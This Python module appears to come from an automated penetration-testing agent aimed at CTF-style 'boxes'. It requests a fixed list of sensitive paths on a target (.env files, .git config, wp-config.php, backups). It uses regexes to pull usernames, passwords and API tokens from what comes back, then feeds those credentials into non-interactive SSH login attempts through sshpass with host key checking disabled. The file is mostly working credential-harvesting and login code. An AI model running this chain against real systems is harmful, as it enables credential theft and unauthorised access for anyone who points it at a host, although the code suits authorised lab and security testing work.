"""Deterministic (non-LLM) execution actions.

This module implements a small set of **generic**, evidence-driven actions
that are reliable across many boxes and do not require LLM reasoning.

These actions intentionally focus on:
  - collecting *real* evidence and extracting structured state
  - enabling multi-track chains via credential_store/session_store

The execution agent can still fall back to LLM-driven commands for actions
that require creativity or target-specific adaptation.
"""

from __future__ import annotations

import re
import shlex
import shutil
from dataclasses import dataclass
from typing import Any, Callable, Dict, List, Optional, Tuple

from urllib.parse import urljoin


Runner = Callable[[str, Optional[str]], Tuple[str, Optional[str]]]


@dataclass
class WebHuntConfig:
    max_base_urls: int = 2
    max_paths: int = 18
    head_timeout_sec: int = 8
    get_timeout_sec: int = 12
    max_text_bytes_hint: int = 200_000


DEFAULT_LEAK_PATHS: List[str] = [
    "/robots.txt",
    "/sitemap.xml",
    "/.env",
    "/app/.env",
    "/config/.env",
    "/.git/HEAD",
    "/.git/config",
    "/.svn/entries",
    "/server-status",
    "/phpinfo.php",
    "/config.php",
    "/wp-config.php",
    "/backup.zip",
    "/backup.tar.gz",
    "/db.sqlite",
    "/database.sqlite",
    "/admin",
    "/login",
]


def _dedupe_keep_order(items: List[str]) -> List[str]:
    seen = set()
    out: List[str] = []
    for x in items:
        s = (x or "").strip()
        if not s:
            continue
        if s in seen:
            continue
        seen.add(s)
        out.append(s)
    return out


def _curl_head(url: str, timeout_sec: int) -> str:
    # -k: ignore TLS issues, -I: HEAD, -sS: silent but show errors
    return f"curl -sS -k -I --max-time {int(timeout_sec)} {shlex.quote(url)}"


def _curl_get(url: str, timeout_sec: int) -> str:
    return f"curl -sS -k --max-time {int(timeout_sec)} {shlex.quote(url)}"


def _parse_http_status(headers: str) -> int:
    if not headers:
        return 0
    m = re.search(r"^HTTP/\S+\s+(\d{3})\b", headers, re.MULTILINE)
    if not m:
        return 0
    try:
        return int(m.group(1))
    except Exception:
        return 0


def _parse_header_value(headers: str, name: str) -> str:
    if not headers or not name:
        return ""
    pat = re.compile(rf"^{re.escape(name)}\s*:\s*(.*?)\s*$", re.IGNORECASE | re.MULTILINE)
    m = pat.search(headers)
    return (m.group(1).strip() if m else "")


def _extract_kv_secrets(text: str) -> List[Dict[str, Any]]:
    """Extract credentials/secrets from env-like or config-like text.

    Conservative strategy:
      - prefer pairs like (USER/USERNAME) + (PASS/PASSWORD)
      - also capture standalone tokens/keys but mark as type=token
    """

    if not text:
        return []

    # Normalize line endings
    t = text.replace("\r\n", "\n")
    lines = [ln.strip() for ln in t.split("\n") if ln.strip() and not ln.strip().startswith("#")]

    # Capture env style KEY=VALUE
    kv: Dict[str, str] = {}
    for ln in lines:
        if "=" not in ln:
            continue
        k, v = ln.split("=", 1)
        k = k.strip()
        v = v.strip().strip('"').strip("'")
        if not k or not v:
            continue
        if len(v) > 4000:
            continue
        kv[k] = v

    # Try to pair username/password-like keys
    user_keys = [k for k in kv.keys() if re.search(r"(?i)(user(name)?|login|db_user|mysql_user)", k)]
    pass_keys = [k for k in kv.keys() if re.search(r"(?i)(pass(word)?|pwd|db_pass|mysql_password)", k)]

    out: List[Dict[str, Any]] = []

    # Pair by closest key name heuristics
    for uk in user_keys:
        for pk in pass_keys:
            u = kv.get(uk, "").strip()
            p = kv.get(pk, "").strip()
            if not u or not p:
                continue
            if len(u) > 64 or len(p) > 128:
                continue
            out.append({"username": u, "secret": p, "type": "password", "source": f"kv:{uk}+{pk}"})

    # Standalone tokens/keys
    for k, v in kv.items():
        if re.search(r"(?i)(token|api[_-]?key|secret|jwt|bearer)", k):
            if 10 <= len(v) <= 200:
                out.append({"username": "", "secret": v, "type": "token", "source": f"kv:{k}"})

    # Also detect inline patterns not captured by KEY=VALUE
    #   username: xxx
    #   password: yyy
    muser = re.search(r"(?i)\buser(?:name)?\b\s*[:=]\s*([a-zA-Z0-9_.-]{1,32})", text)
    mpass = re.search(r"(?i)\bpass(?:word)?\b\s*[:=]\s*([^\s'\"<>]{4,80})", text)
    if muser and mpass:
        out.append({"username": muser.group(1), "secret": mpass.group(1), "type": "password", "source": "inline:user+pass"})

    # De-dup
    uniq: List[Dict[str, Any]] = []
    seen = set()
    for c in out:
        k = (c.get("username", ""), c.get("secret", ""), c.get("type", ""))
        if k in seen:
            continue
        seen.add(k)
        uniq.append(c)

    return uniq[:25]


def run_web_hunt_creds(
    *,
    runner: Runner,
    base_urls: List[str],
    extra_paths: Optional[List[str]] = None,
    cfg: Optional[WebHuntConfig] = None,
) -> Tuple[List[Dict[str, Any]], List[Dict[str, Any]]]:
    """Hunt for exposed credentials/secrets on the web surface.

    Returns:
      - credentials: list[dict]
      - findings: list[dict]
    """

    cfg = cfg or WebHuntConfig()
    base_urls = [u.strip() for u in (base_urls or []) if str(u).strip()]
    base_urls = base_urls[: max(1, cfg.max_base_urls)]

    paths = list(DEFAULT_LEAK_PATHS)
    if extra_paths:
        for p in extra_paths:
            s = (p or "").strip()
            if not s:
                continue
            if not s.startswith("/"):
                s = "/" + s
            paths.append(s)
    paths = _dedupe_keep_order(paths)[: cfg.max_paths]

    creds: List[Dict[str, Any]] = []
    findings: List[Dict[str, Any]] = []

    for bu in base_urls:
        for p in paths:
            url = urljoin(bu.rstrip("/") + "/", p.lstrip("/"))

            head_cmd = _curl_head(url, cfg.head_timeout_sec)
            head_out, _ = runner(head_cmd, None)
            status = _parse_http_status(head_out)
            if status in {0, 400, 401, 403, 404, 405}:
                continue

            ctype = _parse_header_value(head_out, "Content-Type")
            clen = _parse_header_value(head_out, "Content-Length")
            try:
                clen_i = int(clen) if clen else 0
            except Exception:
                clen_i = 0

            # Skip clearly huge binary downloads, unless text/*
            if clen_i and clen_i > cfg.max_text_bytes_hint and ("text" not in (ctype or "").lower()):
                findings.append({
                    "type": "web_candidate_skipped",
                    "url": url,
                    "reason": f"content-length={clen_i} too large (ctype={ctype})",
                })
                continue

            get_cmd = _curl_get(url, cfg.get_timeout_sec)
            body, _ = runner(get_cmd, None)
            if not body or body.startswith("[BLOCKED]"):
                continue

            extracted = _extract_kv_secrets(body)
            if extracted:
                for c in extracted:
                    c["source_url"] = url
                creds.extend(extracted)
                findings.append({
                    "type": "web_secret_hit",
                    "url": url,
                    "count": len(extracted),
                    "status": status,
                    "content_type": ctype,
                })
            else:
                # small positive signal: non-404 and non-empty body for sensitive path
                if p in {"/.env", "/.git/HEAD", "/.git/config", "/wp-config.php", "/config.php"}:
                    findings.append({
                        "type": "web_sensitive_path_accessible",
                        "url": url,
                        "status": status,
                        "content_type": ctype,
                    })

    # Final de-dup
    uniq: List[Dict[str, Any]] = []
    seen = set()
    for c in creds:
        k = (c.get("username", ""), c.get("secret", ""), c.get("type", ""), c.get("source_url", ""))
        if k in seen:
            continue
        seen.add(k)
        uniq.append(c)
    return uniq[:50], findings[:100]


def run_try_ssh(
    *,
    runner: Runner,
    target_ip: str,
    credentials: List[Dict[str, Any]],
    connect_timeout: int = 6,
) -> Tuple[bool, List[Dict[str, Any]]]:
    """Try SSH login with discovered credentials.

    This is intentionally conservative:
      - requires sshpass; otherwise returns (False, findings)
      - executes a single non-interactive command: `id`
      - stops at first success
    """

    findings: List[Dict[str, Any]] = []
    if not target_ip:
        return False, [{"type": "ssh_skipped", "reason": "missing target_ip"}]

    sshpass = shutil.which("sshpass")
    if not sshpass:
        return False, [{"type": "ssh_skipped", "reason": "sshpass not installed"}]

    # Only password creds with a username
    cand = []
    for c in credentials or []:
        if not isinstance(c, dict):
            continue
        if str(c.get("type") or "").lower() != "password":
            continue
        u = str(c.get("username") or "").strip()
        s = str(c.get("secret") or "").strip()
        if not u or not s:
            continue
        if len(u) > 64 or len(s) > 128:
            continue
        cand.append((u, s, c))

    # De-dup by user+secret
    seen = set()
    uniq = []
    for u, s, c in cand:
        k = (u, s)
        if k in seen:
            continue
        seen.add(k)
        uniq.append((u, s, c))

    for u, s, c in uniq[:12]:
        cmd = (
            f"{shlex.quote(sshpass)} -p {shlex.quote(s)} "
            f"ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
            f"-o ConnectTimeout={int(connect_timeout)} -o PreferredAuthentications=password "
            f"-o PubkeyAuthentication=no {shlex.quote(u)}@{shlex.quote(target_ip)} id"
        )
        out, _ = runner(cmd, None)
        lo = (out or "").lower()
        if out.startswith("[BLOCKED]"):
            findings.append({"type": "ssh_blocked", "username": u, "reason": out[:200]})
            continue
        if "permission denied" in lo or "authentication failed" in lo:
            findings.append({"type": "ssh_failed", "username": u})
            continue
        if "uid=" in lo or "groups=" in lo or "last login" in lo:
            findings.append({"type": "ssh_success", "username": u, "proof": out[:300]})
            return True, findings

    return False, findings
